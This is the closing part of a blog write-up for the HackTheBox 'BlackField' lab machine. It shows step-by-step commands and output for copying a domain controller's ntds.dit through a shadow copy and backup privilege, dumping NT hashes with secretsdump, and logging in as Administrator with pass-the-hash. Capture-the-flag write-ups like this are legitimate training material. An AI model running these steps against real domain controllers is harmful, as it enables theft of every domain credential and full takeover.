</span><span class="nf">On</span><span class="w"> </span><span class="nx">computer:</span><span class="w">  </span><span class="nx">DC01</span><span class="p">,</span><span class="w">  </span><span class="nx">9/7/2020</span><span class="w"> </span><span class="nx">4:35:19</span><span class="w"> </span><span class="nx">PM</span><span class="w">

</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nf">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">persistent</span><span class="w"> </span><span class="nx">nowriters</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nf">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">c:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">someAlias</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nf">create</span><span class="w">
</span><span class="nx">Alias</span><span class="w"> </span><span class="nx">someAlias</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="nf">bb78b23-c5da-4f7b-8e69-834510f3d41b</span><span class="p">}</span><span class="w"> </span><span class="nf">set</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">environment</span><span class="w"> </span><span class="nx">variable.</span><span class="w">
</span><span class="nf">Alias</span><span class="w"> </span><span class="nx">VSS_SHADOW_SET</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="p">{</span><span class="mi">03</span><span class="nf">cdd72f-d3bd-4d8f-9434-30bc7cf7fadf</span><span class="p">}</span><span class="w"> </span><span class="nf">set</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">environment</span><span class="w"> </span><span class="nx">variable.</span><span class="w">

</span><span class="nf">Querying</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copies</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="p">{</span><span class="mi">03</span><span class="nf">cdd72f-d3bd-4d8f-9434-30bc7cf7fadf</span><span class="p">}</span><span class="w">

</span><span class="o">*</span><span class="w"> </span><span class="nf">Shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="nf">bb78b23-c5da-4f7b-8e69-834510f3d41b</span><span class="p">}</span><span class="w">		</span><span class="o">%</span><span class="nf">someAlias</span><span class="o">%</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="nf">Shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">set:</span><span class="w"> </span><span class="p">{</span><span class="mi">03</span><span class="nf">cdd72f-d3bd-4d8f-9434-30bc7cf7fadf</span><span class="p">}</span><span class="w">	</span><span class="o">%</span><span class="nf">VSS_SHADOW_SET</span><span class="o">%</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="nf">Original</span><span class="w"> </span><span class="nx">count</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="nf">Original</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">name:</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\Volume</span><span class="p">{</span><span class="nx">351b4712-0000-0000-0000-602200000000</span><span class="p">}</span><span class="nf">\</span><span class="w"> </span><span class="p">[</span><span class="nf">C:\</span><span class="p">]</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="kt">Creation</span><span class="w"> </span><span class="kt">time</span><span class="p">:</span><span class="w"> </span><span class="mi">9</span><span class="nf">/7/2020</span><span class="w"> </span><span class="nx">4:35:20</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="kt">Shadow</span><span class="w"> </span><span class="kt">copy</span><span class="w"> </span><span class="kt">device</span><span class="w"> </span><span class="kt">name</span><span class="p">:</span><span class="w"> </span><span class="nf">\\?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy3</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="nx">Originating</span><span class="w"> </span><span class="nx">machine:</span><span class="w"> </span><span class="nx">DC01.BLACKFIELD.local</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="kt">Service</span><span class="w"> </span><span class="kt">machine</span><span class="p">:</span><span class="w"> </span><span class="no">DC01.BLACKFIELD.</span><span class="kt">local</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="kt">Not</span><span class="w"> </span><span class="kt">exposed</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="kt">Provider</span><span class="w"> </span><span class="kt">ID</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="kt">b5946137</span><span class="nt">-7b9f-4925-af80-51abd60b20d5</span><span class="p">}</span><span class="w">
</span><span class="nf">-</span><span class="w"> </span><span class="kt">Attributes</span><span class="p">:</span><span class="w">  </span><span class="kt">No_Auto_Release</span><span class="w"> </span><span class="kt">Persistent</span><span class="w"> </span><span class="kt">No_Writers</span><span class="w"> </span><span class="kt">Differential</span><span class="w">

</span><span class="kt">Number</span><span class="w"> </span><span class="kt">of</span><span class="w"> </span><span class="kt">shadow</span><span class="w"> </span><span class="kt">copies</span><span class="w"> </span><span class="kt">listed</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="kt">expose</span><span class="w"> </span><span class="o">%</span><span class="kt">someAlias</span><span class="o">%</span><span class="w"> </span><span class="nf">z:</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">someAlias</span><span class="o">%</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="kt">bb78b23</span><span class="nt">-c5da-4f7b-8e69-834510f3d41b</span><span class="p">}</span><span class="w">
</span><span class="kt">The</span><span class="w"> </span><span class="kt">shadow</span><span class="w"> </span><span class="kt">copy</span><span class="w"> </span><span class="kt">was</span><span class="w"> </span><span class="kt">successfully</span><span class="w"> </span><span class="kt">exposed</span><span class="w"> </span><span class="kt">as</span><span class="w"> </span><span class="nf">z:\.</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w">
</span><span class="o">*</span><span class="kt">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="kt">PS</span><span class="w"> </span><span class="nf">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">robocopy</span><span class="w"> </span><span class="nx">z:\windows\ntds\</span><span class="w"> </span><span class="nx">c:\Users\svc_backup\Temp\</span><span class="w"> </span><span class="nx">ntds.dit</span><span class="w"> </span><span class="nx">/B</span><span class="w">
</span></pre></table></code></div></div><p>I used robocopy with /B flag to tell the program to copy ntds.dit using my back up privilege to my working directory</p><blockquote><p><strong><em>As you seen here I just copied the ntds.dit file and then leaved it like that I’m not a professional pentester or something like that but I’m pretty sure you can’t let the shadow copy like that you shall delete it but since it’s just a CTF it’s not a big deal to me at least ;)</em></strong></p></blockquote><p>and now we’re going to wait a little while the download finish :)</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp</span><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">download</span><span class="w"> </span><span class="nx">ntds.dit</span><span class="w">
</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Downloading</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp\ntds.dit</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">ntds.dit</span><span class="w">


</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Download</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">

</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>and now since we got all we need let’s extract hashes :D we will be using one of impacket scripts wich is secretsdump.py so we will run</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system.hive <span class="nb">local
</span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:2896ccb38103e6b83384035356a01a28:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:83813b942c09a3ec57498363fb26d3cb:::
<span class="nb">.</span>
<span class="nb">.</span>
<span class="nb">.</span>
</pre></table></code></div></div><p>The output is long but as you see here we’ve got admin hash now let’s login</p><blockquote><p>As you see here we’ve got Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: the hash that we use to login is the NT hash wich is 184fb5e5178480be64824d4cd53b99ee</p></blockquote><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>evil-winrm <span class="nt">-H</span> 184fb5e5178480be64824d4cd53b99ee <span class="nt">-u</span> Administrator <span class="nt">-i</span> 10.10.10.192

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">ls


</span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        2/23/2020   5:03 AM                forensic



<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cat</span> ../Desktop/root.txt
a6d8ae6c82647d0772926273f73c6a9f
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
</pre></table></code></div></div><p>That’s all :D it was a great machine thanks for reading</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/hard/" class="post-tag no-text-decoration" >Hard</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox BlackField Writeup - cantchasee&url=https://cantchasee.github.io/posts/HTB-BlackField-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox BlackField Writeup - cantchasee&u=https://cantchasee.github.io/posts/HTB-BlackField-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox BlackField Writeup - cantchasee&url=https://cantchasee.github.io/posts/HTB-BlackField-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Traceback-Writeup/">HackTheBox Traceback Writeup</a></li><li><a href="/posts/HTB-BlackField-Writeup/">HackTheBox BlackField Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/hard/">Hard</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Traceback-Writeup/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 15 <i class="unloaded">2020-08-15T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Traceback Writeup</h3><div class="text-muted small"><p> Hello hackerz, today Traceback machine was retired so here is my writeup :D Recon First of all, let’s start with a basic nmap scan: $nmap -A 10.10.10.181 Starting Nmap 7.80 ( https://nmap.org )...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Doctor-Writeup/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 23 <i class="unloaded">2020-10-23T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Doctor Writeup</h3><div class="text-muted small"><p> Doctor is a linux machine that is ranked easy and trust me it’s not easy :| Recon So as usally let’s start with a fast nmap scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌─[cantchasee@parrot]─[~/Hack...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Bucket-Writeup/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 29 <i class="unloaded">2020-10-29T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Bucket Writeup</h3><div class="text-muted small"><p> Hello guys, in this writeup we will hack Bucket which is an awesome box, it’s ranked medium, and it’s really a medium box but a very enjoyable one, we will need to abuse a misconfigured s3 bucket t...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Traceback-Writeup/" class="btn btn-outline-primary"><p>HackTheBox Traceback Writeup</p></a> <a href="/posts/RSA-explained/" class="btn btn-outline-primary"><p>RSA explained</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://github.com/cantchasee/">cantchasee</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/hard/">Hard</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-177244605-1', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://cantchasee.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
